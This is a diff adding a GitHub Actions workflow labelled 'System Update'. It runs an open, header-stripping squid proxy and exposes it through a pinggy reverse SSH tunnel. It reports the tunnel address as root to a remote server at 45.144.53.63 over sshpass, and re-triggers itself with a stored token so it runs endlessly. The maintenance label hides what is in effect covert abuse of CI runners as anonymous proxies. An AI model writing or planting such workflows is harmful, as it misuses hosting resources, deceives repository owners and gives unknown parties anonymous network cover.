@@ -1,0 +1,100 @@
+name: System Update
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '*/15 * * * *'  
+
+concurrency:
+  group: system-update
+  cancel-in-progress: false
+
+jobs:
+  maintenance:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    steps:
+      - name: Install squid and tools
+        run: sudo apt update && sudo apt install squid sshpass openssh-client -y
+
+      - name: Config squid
+        run: |
+          sudo bash -c 'cat > /etc/squid/squid.conf << EOF
+          http_port 3128
+          http_access allow all
+          forwarded_for off
+          via off
+          visible_hostname localhost
+          EOF'
+          sudo systemctl restart squid
+
+      - name: Start pinggy tunnel with retry
+        run: |
+          rm -f pinggy.log pinggy_url.txt
+
+          for i in {1..3}; do
+            echo "Attempt $i..."
+
+            pkill -f "ssh.*pinggy" || true
+            sleep 2
+
+            ssh \
+              -p 443 \
+              -o StrictHostKeyChecking=no \
+              -o ServerAliveInterval=30 \
+              -o ExitOnForwardFailure=yes \
+              -R0:localhost:3128 \
+              tcp@a.pinggy.io > pinggy.log 2>&1 &
+
+            sleep 20
+
+            echo "=== PINGGY LOG ==="
+            cat pinggy.log || true
+
+            PINGGY_URL=$(grep -Eo '[a-zA-Z0-9.-]+\.pinggy\.(link|io):[0-9]+' pinggy.log | head -1)
+
+            if [ -n "${PINGGY_URL}" ]; then
+              echo "${PINGGY_URL}" > pinggy_url.txt
+              echo "Got tunnel: ${PINGGY_URL}"
+              break
+            fi
+
+            echo "Retrying..."
+            sleep 5
+          done
+
+          if [ ! -s pinggy_url.txt ]; then
+            echo "ERROR: No pinggy tunnel after retries"
+            exit 1
+          fi
+
+      - name: Get address and upload
+        env:
+          REM: ${{ secrets.REM }}
+        run: |
+          PINGGY_URL=$(cat pinggy_url.txt)
+
+          echo "Sync OK (${PINGGY_URL})"
+
+          sshpass -p "${REM}" ssh -o StrictHostKeyChecking=no root@45.144.53.63 "
+            echo '${PINGGY_URL}' >> /var/www/html/git.txt
+            echo '=== REMOTE FILE ==='
+            ls -l /var/www/html/git.txt
+          "
+
+      - name: Keep tunnel alive
+        run: sleep 943
+
+      - name: Wait before next run
+        if: success()
+        run: sleep 137
+
+      - name: Re-trigger next run
+        if: success()
+        env:
+          GH_TOKEN: ${{ secrets.PAT_TOKEN }}
+        run: |
+          gh workflow run "${{ github.workflow }}" \
+            --repo "${{ github.repository }}" \
+            --ref "${{ github.ref_name }}"
